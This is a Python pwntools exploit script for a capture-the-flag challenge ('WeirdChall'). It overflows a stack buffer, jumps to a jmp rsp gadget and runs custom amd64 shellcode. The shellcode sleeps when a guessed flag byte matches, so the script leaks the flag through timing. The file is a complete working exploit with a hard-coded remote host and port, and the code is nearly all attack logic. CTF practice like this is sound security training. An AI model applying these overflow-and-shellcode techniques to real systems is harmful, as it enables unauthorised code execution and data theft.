from pwn import *
import time

# --- Info ---
# CTF: DEKRA
# Date: -
# Challenge: WeirdChall
# Description: Leak the flag through a time-based shellcode
# --- End Info ---

context.log_level = 'critical'
context.arch = 'amd64'

HOST = '168.119.247.237'
PORT = 5013

REMOTE = 0

x = ELF('./challenge')

offset = 64

flag = ''

i = 0

print('[*] Started bruteforce against flag...')

# -----

#gdb.attach(r)
#pause()

jmp_rsp = 0x00000000004011c6

while True:
	for char in range(0xff):

		r = remote(HOST, PORT) if REMOTE else process('./challenge')
		# -- get flag addr --

		flag_leak = r.recvuntil('\n').decode()
		flag_leak = (flag_leak.split('0x'))[1].split('\n')[0].replace('...','')
		flag_leak = int(f'0x{flag_leak}', 16)

		log.info(f'flag @ {hex(flag_leak)}')
                # int nanosleep(const struct timespec *req, struct timespec *rem);
                # struct timespec {
                #   time_t tv_sec;        /* seconds */
                #   long   tv_nsec;       /* nanoseconds */
                # };

		shellcode_assembly = '''

			mov r8, __mem_addr_here_
			movzx eax, byte ptr [r8+__position_here_]
			cmp al, __character_here_
			jne bye
		        push 0
		        push 3
		        xor rsi, rsi
		        mov rdi, rsp
		        mov rax, 35
		        syscall
		        
		        bye:
		            mov rax, 60
		            syscall

		'''.replace('__mem_addr_here_', hex(flag_leak))
		shellcode_assembly = shellcode_assembly.replace('__position_here_', str(i))
		shellcode_assembly = shellcode_assembly.replace('__character_here_', str(char))

		shellcode = asm(shellcode_assembly, arch='amd64', os='linux')

		payload = b''
		payload += b'A'*(offset)
		payload += b'B'*8
		payload += p64(jmp_rsp)
		payload += shellcode

		#pause()

		pre_t = time.time()

		r.sendline(payload)

		try:
			r.recvall()
		except:
			continue

		post_t = time.time()

		r.close()

		if ((post_t - pre_t) > 3):
			print(f'[*] Found new char: flag[{str(i)}] = {hex(char)}')
			i += 1
			flag += chr(char)
			if (chr(char) == '}'):
				print(f'[+] Flag: {flag}')
				exit()

			break

